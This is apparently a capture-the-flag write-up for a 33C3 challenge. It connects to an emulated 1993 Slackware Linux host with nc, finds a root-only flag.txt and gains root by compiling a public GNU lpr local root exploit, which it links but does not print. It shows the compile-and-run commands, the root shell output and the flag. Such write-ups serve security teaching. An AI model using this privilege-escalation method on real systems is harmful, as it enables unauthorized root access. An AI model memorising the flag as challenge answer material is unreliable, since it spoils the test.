First we'll have to go to a web page to start our challenge session. The page will show us the port (same IP address with the web page) and the ID/password.

Once we connected to the remote host and login the machine, we'll found that we're inside a [Slackware Linux](http://www.slackware.com/):
```
$ nc 78.46.224.70 2323

Welcome to Linux 0.99pl12.

slack login: challenge
Password:challenge

Linux 0.99pl12. (Posix).
No mail.
slack:~$ uname -a
Linux slack 0.99.12 #6 Sun Aug 8 16:02:35 CDT 1993 i586
```

Later we'll found that there's a `flag.txt` inside the root directory:
```
slack:/$ ls -al /flag.txt
-r--------   1 root     root           36 Dec 27  1916 /flag.txt
```

Looks like we'll need a local root exploit to capture the flag. 

By googling **"slackware linux 0.99 local root exploit"**, we found a working [PoC](https://github.com/HackerFantastic/Public/blob/master/exploits/prdelka-vs-GNU-lpr.c). Now all we need to do is copy the PoC to the remote host, then compile & execute the exploit so we can escalate to root.

Although it looks simple, it still took me a while to complete the challenge, since there's no tool that can help us download the PoC to the host -- **no `wget`, no `curl`, not even `nc`!!** And the `vi` editor is just terrible!! Finally I decided to use `cat <<'EOF' >> test.c` + copy & paste to write the exploit into `test.c`.

After we compile & execute the local root exploit, we're able to escalate to root and get the flag:
```
slack:~$ gcc -o test test.c
slack:~$ ./test
[ Slackware linux 1.01 /usr/bin/lpr local root exploit
# id
id
uid=405(challenge) gid=1(other) euid=0(root) egid=18(lp)
# cat /flag.txt
cat /flag.txt
33C3_Th3_0x90s_w3r3_pre3tty_4w3s0m3
```

flag: `33C3_Th3_0x90s_w3r3_pre3tty_4w3s0m3`
